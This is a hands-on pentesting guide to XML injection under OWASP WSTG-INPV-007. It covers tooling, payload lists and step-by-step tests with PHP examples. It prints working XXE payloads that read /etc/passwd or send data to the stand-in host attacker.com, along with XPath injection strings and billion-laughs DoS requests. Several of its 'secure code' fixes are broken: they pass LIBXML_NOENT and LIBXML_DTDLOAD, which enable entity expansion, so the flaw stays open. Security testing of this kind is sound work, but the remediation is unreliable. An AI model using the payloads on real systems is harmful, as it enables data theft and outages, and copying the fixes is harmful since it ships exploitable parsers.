# Testing for XML Injection Vulnerabilities

## Overview

Testing for XML Injection vulnerabilities involves verifying that a web application properly sanitizes user input incorporated into XML documents, payloads, or queries to prevent attackers from manipulating XML structure or content. According to OWASP (WSTG-INPV-007), XML Injection occurs when untrusted input is processed without validation, enabling attackers to alter XML data, extract sensitive information, execute external entity (XXE) attacks, or disrupt application functionality via denial-of-service (DoS). This guide provides a hands-on methodology to test for XML Injection vulnerabilities, focusing on input vectors, payload injection, XXE attacks, XPath injection, and XML parser sabotage, with tools, commands, payloads, and remediation strategies.

**Impact**: XML Injection vulnerabilities can lead to:
- Unauthorized access to sensitive data (e.g., server files via XXE).
- Modification of XML-based data (e.g., user attributes).
- Application crashes or DoS due to malformed XML.
- Bypassing authentication via XPath manipulation.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-INPV-007, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as XML injection attempts, especially XXE, may access sensitive server resources, cause crashes, or trigger security alerts.

## Testing Tools

The following tools are recommended for testing XML Injection vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject XML payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify XML endpoints.
  - **Note**: Check responses for XML errors or data leaks.

- **OWASP ZAP 3.0**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with XXE rules; manually verify findings due to limited XML injection support.

- **cURL and HTTPie**: Send HTTP requests with XML payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i -X POST -H "Content-Type: application/xml" --data "<user><name>admin</name></user>" "http://example.com/api"
      # HTTPie
      http POST http://example.com/api Content-Type:application/xml @payload.xml
      ```

- **Postman**: GUI tool for testing XML injection in APIs.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send XML payloads in the Body tab (raw, application/xml).
  - **Tip**: Use Collections for batch testing payloads.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects responses to XML payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze responses and Elements tab for error messages.
  - **Note**: Firefox’s 2025 XML response rendering improvements enhance inspection.

- **SOAPUI**: Tests XML-based web services (e.g., SOAP APIs).
  - Download from [SoapUI](https://www.soapui.org/downloads/soapui/).
  - Create a new SOAP project and inject payloads in requests.
  - **Tip**: Use for XML-heavy APIs.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-007, testing XML Injection vulnerabilities across input vectors, payload injection, XXE attacks, XPath injection, and XML parser sabotage.

### Common XML Injection Payloads

Below is a list of common XML Injection payloads to test various XML processing vulnerabilities. Start with simple payloads and escalate based on responses. Use with caution and verify results manually.

- **Basic Injection**:
  - `</name><role>admin</role><name>` (Adds new XML element)
  - `<![CDATA[<script>alert(123)</script>]]>` (Injects CDATA content)
  - `&invalid;` (Tests for undefined entity errors)

- **XXE Payloads**:
  - `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>` (Reads local file)
  - `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/data">]><root>&xxe;</root>` (Exfiltrates data)
  - `<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;` (Alternative XXE format)

- **XPath Injection Payloads**:
  - `' or '1'='1` (Bypasses XPath conditions)
  - `' or //*[1]=1 or ''='` (Extracts all nodes)
  - `admin' or name()='user` (Targets specific elements)

- **DoS Payloads**:
  - `<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;">...]>` (Billion laughs attack)
  - `<?xml version="1.0"?><root><data>AAAA...[1MB+]</data></root>` (Large payload)

**Note**: Adjust payloads for the application’s XML structure and test in controlled environments to avoid unintended disruption.

### 1. Identify XML Input Vectors

**Objective**: Locate user-controllable inputs that interact with XML processing.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify forms, APIs, or endpoints accepting XML (e.g., SOAP, REST with XML).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or API requests to capture in HTTP History.
   - Note XML payloads (e.g., `<user><name>admin</name></user>`).
3. Inspect headers and responses:
   - Check for `Content-Type: application/xml` or `text/xml`.
   - Use Developer Tools (`Ctrl+Shift+I`) to search for XML in Network tab.
4. List input vectors:
   - Document query parameters, form fields, XML body, and headers.

**Example Input Vectors**:
- URL: `http://example.com/api?xml=<user>admin</user>`
- Form: `<input name="data" value="<name>admin</name>">`
- API: `POST /api` with `<user><name>admin</name></user>`

**Remediation**:
- Validate XML inputs with schemas:
  ```xml
  <xs:schema>
    <xs:element name="user" type="xs:string"/>
  </xs:schema>
  ```
- Sanitize inputs:
  ```php
  $input = preg_replace('/[<>&]/', '', $input);
  ```

**Tip**: Save the input vector list in a report.

### 2. Test for XML Payload Injection

**Objective**: Verify if user input can manipulate XML structure.

**Steps**:
1. Identify XML inputs:
   - Look for fields or APIs accepting XML-like data.
2. Inject payloads:
   - Use Burp Repeater:
     ```http
     POST /api HTTP/1.1
     Host: example.com
     Content-Type: application/xml
     <user><name>admin</name><role>admin</role></user>
     ```
   - Use cURL:
     ```bash
     curl -i -X POST -H "Content-Type: application/xml" --data "<user><name>admin</name><role>admin</role></user>" "http://example.com/api"
     ```
3. Check responses:
   - Look for modified data (e.g., user role changed to admin).
   - Check for XML parsing errors.
4. Test CDATA:
   - Try: `<![CDATA[<script>alert(123)</script>]]>`

**Example Vulnerable Code (PHP)**:
```php
$xml = simplexml_load_string($_POST['xml']);
$role = $xml->role;
```
Test: `<user><name>admin</name><role>admin</role></user>`
Result: Sets role to admin.

**Example Secure Code (PHP)**:
```php
$xml = simplexml_load_string($_POST['xml'], null, LIBXML_NOENT | LIBXML_DTDLOAD);
if (!preg_match('/^[a-zA-Z0-9]+$/', $xml->name)) die("Invalid input");
```
Test: No role change.

**Remediation**:
- Use XML schema validation:
  ```php
  libxml_use_internal_errors(true);
  $xml->schemaValidate('schema.xsd');
  ```
- Disable entity expansion:
  ```php
  libxml_disable_entity_loader(true);
  ```

**Tip**: Save modified data evidence in a report.

### 3. Test for XML External Entity (XXE) Attacks

**Objective**: Check if the application processes external entities to access server resources.

**Steps**:
1. Inject XXE payloads:
   - Use Burp:
     ```http
     POST /api HTTP/1.1
     Host: example.com
     Content-Type: application/xml
     <?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
     ```
   - Use HTTPie with file:
     ```bash
     echo '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' > payload.xml
     http POST http://example.com/api Content-Type:application/xml @payload.xml
     ```
2. Check responses:
   - Look for sensitive data (e.g., `/etc/passwd` contents).
   - Test network-based XXE: `<!ENTITY xxe SYSTEM "http://attacker.com/data">`.
3. Test blind XXE:
   - Use out-of-band (OOB) payloads:
     ```xml
     <!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/%data;"> %xxe;]>
     ```

**Example Vulnerable Code (PHP)**:
```php
$xml = simplexml_load_string($_POST['xml']);
echo $xml;
```
Test: `<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`
Result: Displays `/etc/passwd`.

**Example Secure Code (PHP)**:
```php
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($_POST['xml'], null, LIBXML_NOENT);
```
Test: No file access.

**Remediation**:
- Disable DTD processing:
  ```php
  libxml_disable_entity_loader(true);
  ```
- Use safe XML parsers:
  ```python
  from lxml import etree
  parser = etree.XMLParser(resolve_entities=False)
  ```

**Tip**: Save sensitive data leaks in a report.

### 4. Test for XPath Injection

**Objective**: Verify if user input can manipulate XPath queries.

**Steps**:
1. Identify XPath inputs:
   - Look for search or login forms querying XML data.
2. Inject payloads:
   - Use Burp:
     ```http
     POST /search HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     query=admin' or '1'='1
     ```
   - Use cURL:
     ```bash
     curl -i -X POST -d "query=admin' or '1'='1" "http://example.com/search"
     ```
3. Check responses:
   - Look for all records or unauthorized data.
   - Test: `' or //*[1]=1 or ''='`.
4. Confirm with XML:
   - Test: `query=admin' or name()='user`

**Example Vulnerable Code (PHP)**:
```php
$xpath = new DOMXPath($xml);
$result = $xpath->query("//user[name='$query']/password");
```
Test: `query=admin' or '1'='1`
Result: Returns all passwords.

**Example Secure Code (PHP)**:
```php
$query = preg_replace('/[^a-zA-Z0-9]/', '', $query);
$xpath = new DOMXPath($xml);
$result = $xpath->query("//user[name='$query']/password");
```
Test: No data returned.

**Remediation**:
- Sanitize XPath inputs:
  ```php
  $query = htmlspecialchars($query, ENT_QUOTES, 'UTF-8');
  ```
- Use parameterized XPath queries if supported.

**Tip**: Save extracted data in a report.

### 5. Test for XML Parser Sabotage (DoS)

**Objective**: Check if malformed XML causes application crashes or resource exhaustion.

**Steps**:
1. Inject DoS payloads:
   - Use Burp:
     ```http
     POST /api HTTP/1.1
     Host: example.com
     Content-Type: application/xml
     <!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;">...]><root>&lol9;</root>
     ```
   - Use cURL:
     ```bash
     curl -i -X POST -H "Content-Type: application/xml" --data "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;\">]><root>&lol1;</root>" "http://example.com/api"
     ```
2. Test large payloads:
   - Send 1MB+ XML data:
     ```xml
     <root><data>AAAA...[1MB]</data></root>
     ```
3. Check responses:
   - Look for server timeouts, 500 errors, or crashes.
4. Monitor server impact:
   - Observe response times or logs (if accessible).

**Example Vulnerable Code (PHP)**:
```php
$xml = simplexml_load_string($_POST['xml']);
```
Test: Billion laughs payload
Result: Server crash or timeout.

**Example Secure Code (PHP)**:
```php
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($_POST['xml'], null, LIBXML_NOENT | LIBXML_COMPACT);
```
Test: No crash.

**Remediation**:
- Limit XML input size:
  ```php
  if (strlen($xml) > 10000) die("Input too large");
  ```
- Disable entity expansion:
  ```php
  libxml_disable_entity_loader(true);
  ```
- Use resource limits:
  ```python
  parser = etree.XMLParser(huge_tree=False)
  ```

**Tip**: Save server response times or errors in a report.
